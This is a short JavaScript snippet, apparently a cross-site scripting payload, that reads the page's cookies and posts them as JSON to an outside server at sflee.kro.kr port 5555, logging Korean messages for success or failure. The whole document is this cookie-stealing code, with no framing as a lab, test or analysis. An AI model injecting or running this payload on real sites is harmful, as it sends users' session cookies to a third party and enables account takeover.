(function() {
    const Url = '//sflee.kro.kr:5555/api/v1/my_cookie_info';

    const cookies = document.cookie;

    fetch(Url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ cookies: cookies })
    })
    .then(response => response.text())
    .then(result => console.log('전송 완료:', result))
    .catch(error => console.error('전송 실패:', error));
})();
